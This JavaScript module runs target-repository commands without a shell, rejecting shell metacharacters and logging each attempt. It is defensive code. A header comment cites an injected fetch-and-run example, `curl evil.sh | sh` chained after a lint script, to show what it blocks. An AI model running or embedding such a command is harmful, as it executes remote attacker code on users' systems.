'use strict';

/**
 * Shared, shell-free command runner (roadmap M1 / M9, Phase 1 + Phase 6).
 *
 * Every place UserEye may execute a command that originates from the *target*
 * repository funnels through this module. Two guarantees:
 *
 *   1. **No shell.** Commands are tokenized here and handed to
 *      `child_process.spawn(file, argv, { shell: false })`. A target repo that
 *      names a script `lint && curl evil.sh | sh` can no longer get the `&&`
 *      interpreted: the metacharacters either fail tokenization (rejected) or
 *      survive as literal argv entries.
 *   2. **Audit trail.** Every attempt — executed, blocked or failed — is
 *      recorded so `result.json` can show exactly what ran.
 *
 * The tokenizer accepts POSIX-ish quoting (single quotes, double quotes,
 * backslash escapes) and *rejects* anything that would need a shell to mean
 * what it says: `; & | > < ` $ ( ) { } * ? [ ] ~ \n`. Callers that need such a
 * command must express it as an explicit argv array instead.
 */

const { spawn } = require('child_process');

/** Characters that only have meaning inside a shell. Unquoted => reject. */
const SHELL_METACHARACTERS = /[;&|<>`$(){}[\]*?!\n\r]/;

class ShellSyntaxError extends Error {
  constructor(message, command) {
    super(message);
    this.name = 'ShellSyntaxError';
    this.command = command;
  }
}

/**
 * Split a command string into `[file, ...args]` without invoking a shell.
 *
 * @param {string} command Command line, e.g. `npm run lint`.
 * @returns {string[]} argv tokens (index 0 is the executable).
 * @throws {ShellSyntaxError} When the command needs shell semantics.
 */
function tokenizeCommand(command) {
  const source = String(command || '').trim();
  if (!source) {
    throw new ShellSyntaxError('Empty command.', command);
  }
  const tokens = [];
  let current = '';
  let started = false;
  let quote = null;
  for (let index = 0; index < source.length; index += 1) {
    const character = source[index];
    if (quote) {
      if (character === quote) {
        quote = null;
        continue;
      }
      if (quote === '"' && character === '\\') {
        const next = source[index + 1];
        if (next === '"' || next === '\\' || next === '$' || next === '`') {
          current += next;
          index += 1;
          continue;
        }
      }
      current += character;
      continue;
    }
    if (character === "'" || character === '"') {
      quote = character;
      started = true;
      continue;
    }
    if (character === '\\') {
      const next = source[index + 1];
      if (next === undefined) {
        throw new ShellSyntaxError('Command ends with a dangling escape.', command);
      }
      current += next;
      started = true;
      index += 1;
      continue;
    }
    if (/\s/.test(character)) {
      if (started) {
        tokens.push(current);
        current = '';
        started = false;
      }
      continue;
    }
    if (SHELL_METACHARACTERS.test(character)) {
      throw new ShellSyntaxError(
        `Command needs a shell (unquoted "${character}"), which UserEye never provides: ${source}`,
        command,
      );
    }
    current += character;
    started = true;
  }
  if (quote) {
    throw new ShellSyntaxError('Command has an unterminated quote.', command);
  }
  if (started) {
    tokens.push(current);
  }
  if (!tokens.length) {
    throw new ShellSyntaxError('Empty command.', command);
  }
  return tokens;
}

/** Render an argv array back into a readable (never re-executed) string. */
function formatCommand(argv) {
  return argv.map(token => (/[\s"']/.test(token) ? JSON.stringify(token) : token)).join(' ');
}

/**
 * Append-only record of every command UserEye considered running.
 * Serialized into `result.json` / `plan.json` as `commandAudit`.
 */
class CommandAudit {
  constructor() {
    this.entries = [];
  }

  record(entry) {
    const row = {
      at: new Date().toISOString(),
      source: entry.source || 'unknown',
      id: entry.id || null,
      command: entry.command || (entry.argv ? formatCommand(entry.argv) : null),
      argv: entry.argv || null,
      cwd: entry.cwd || null,
      shell: false,
      decision: entry.decision,
      reason: entry.reason || null,
      exitCode: entry.exitCode === undefined ? null : entry.exitCode,
      durationMs: entry.durationMs === undefined ? null : entry.durationMs,
    };
    this.entries.push(row);
    return row;
  }

  toJSON() {
    return this.entries;
  }

  get executed() {
    return this.entries.filter(entry => entry.decision === 'executed');
  }

  get blocked() {
    return this.entries.filter(entry => entry.decision === 'blocked');
  }
}

/**
 * Spawn a command with `shell: false`, capturing merged stdout/stderr.
 *
 * @param {object} options
 * @param {string[]} [options.argv] Pre-tokenized argv.
 * @param {string} [options.command] Command string (tokenized here).
 * @param {string} options.cwd Working directory.
 * @param {object} [options.env] Environment.
 * @param {number} [options.timeoutMs] Kill after this long.
 * @param {number} [options.maxOutputBytes]
 * @param {boolean} [options.detached]
 * @returns {Promise<{status:'passed'|'failed', exitCode:number|null, signal:string|null, output:string, durationMs:number, argv:string[], command:string}>}
 */
function runCommand(options = {}) {
  const argv = options.argv || tokenizeCommand(options.command);
  const command = formatCommand(argv);
  const maxOutputBytes = options.maxOutputBytes || 100_000;
  const started = Date.now();
  return new Promise(resolve => {
    let child;
    try {
      child = spawn(argv[0], argv.slice(1), {
        cwd: options.cwd,
        env: options.env || process.env,
        shell: false,
        stdio: ['ignore', 'pipe', 'pipe'],
        detached: options.detached === true,
      });
    } catch (error) {
      resolve({
        status: 'failed',
        exitCode: null,
        signal: null,
        output: error.message,
        durationMs: Date.now() - started,
        argv,
        command,
      });
      return;
    }
    let output = '';
    const append = chunk => {
      output += chunk.toString();
      if (output.length > maxOutputBytes) {
        output = output.slice(-maxOutputBytes);
      }
    };
    child.stdout.on('data', append);
    child.stderr.on('data', append);
    const timer = options.timeoutMs ? setTimeout(() => child.kill('SIGKILL'), options.timeoutMs) : null;
    child.once('error', error => {
      if (timer) clearTimeout(timer);
      resolve({
        status: 'failed',
        exitCode: null,
        signal: null,
        output: error.message,
        durationMs: Date.now() - started,
        argv,
        command,
      });
    });
    child.once('exit', (code, signal) => {
      if (timer) clearTimeout(timer);
      resolve({
        status: code === 0 ? 'passed' : 'failed',
        exitCode: code,
        signal: signal || null,
        output: output.slice(-12_000),
        durationMs: Date.now() - started,
        argv,
        command,
      });
    });
  });
}

/**
 * Spawn a long-lived process (app under test) with `shell: false`.
 * Returns the ChildProcess so the caller can stream and stop it.
 */
function spawnProcess(options = {}) {
  const argv = options.argv || tokenizeCommand(options.command);
  const child = spawn(argv[0], argv.slice(1), {
    cwd: options.cwd,
    env: options.env || process.env,
    shell: false,
    detached: options.detached === true,
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  child.usereyeArgv = argv;
  return child;
}

module.exports = {
  CommandAudit,
  ShellSyntaxError,
  SHELL_METACHARACTERS,
  formatCommand,
  runCommand,
  spawnProcess,
  tokenizeCommand,
};
